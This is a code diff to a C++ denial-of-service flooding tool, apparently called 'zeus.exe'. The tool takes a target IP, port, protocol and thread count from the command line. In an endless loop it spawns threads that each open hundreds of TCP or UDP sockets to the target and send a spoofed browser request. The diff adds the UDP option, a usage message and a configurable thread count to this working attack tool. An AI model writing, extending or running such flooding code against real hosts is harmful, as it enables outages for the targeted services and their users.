@@ -4,17 +4,11 @@
 #include <vector>
 #include <unistd.h>
 #include <time.h>
+#include <stdlib.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
 using namespace std;
-
-/* TO-DO:
-	-[x] Make threading work
- 	- Implement switch between TCP and UDP
- 	- Add more user agents	
-*/
-
 
 // Variables
 const char *banner =R""""(
@@ -29,10 +23,23 @@ $$$$$$$$\\$$$$$$$\ \$$$$$$  |$$$$$$$  |
 )"""";
 int socketIter = 700;
 const char *getReq = "GET / HTTP 1.1 Mozzila/4.0(compatible; MSIE 6.0; window NT 5.1; SV1) \r\n";
-int threadCount = 5;
+void usage(){
+	cout << R""""(
+Usage: ./zeus.exe <IP> <port> <protocol (1/2)> <threads (5)>
+
+	IP: The target IP address.
+	Port: The target port
+	Protocol: 1 for TCP and 2 for UDP.
+	Threads: The number of threads.
+	
+)"""";
+	exit(1);
+
+};
+
 
 // Socket
-int socketOps(const char *target,int port){
+int socketOps(const char *target,int port,int prot){
 	// Creation
 	struct sockaddr_in host;
 	int sock,conn;
@@ -40,8 +47,18 @@ int socketOps(const char *target,int port){
 	host.sin_family = AF_INET;
 	host.sin_port = htons(port);
 	for(int i = 0; i < socketIter; i++){
-		// Connection
-		sock = socket(AF_INET, SOCK_STREAM, 0);
+		// Connection and protocol check
+		switch(prot){
+			case 1:
+				sock = socket(AF_INET,SOCK_STREAM,0);
+				break;
+			case 2:
+				sock = socket(AF_INET,SOCK_DGRAM,0);
+				break;
+			default:
+				cout << "Wrong protocol...\n";
+				usage();
+		};
 		if (sock < 0){
 			cout << "Socket cannot be created\n";
 			// Checking for errors that occured during testing
@@ -78,6 +95,11 @@ int socketOps(const char *target,int port){
 
 // MAIN
 int main(int argc, char *argv[]){
+	// Check for the presence of values
+	if (!argv[1] || !argv[2] || !argv[3] || !argv[4]){
+		usage();
+	}
+	int threadCount = atoi(argv[4]);
 	//Banner
 	cout << banner;
 	sleep(4);
@@ -85,7 +107,7 @@ int main(int argc, char *argv[]){
 	while (true){
 		vector <thread> threads(threadCount);
 		for(int i = 0; i < threadCount; i++){
-			threads.push_back(thread(socketOps, argv[1], atoi(argv[2])));
+			threads.push_back(thread(socketOps, argv[1], atoi(argv[2]),atoi(argv[3])));
 		};
 		for (auto &th : threads){
 			if (th.joinable()){
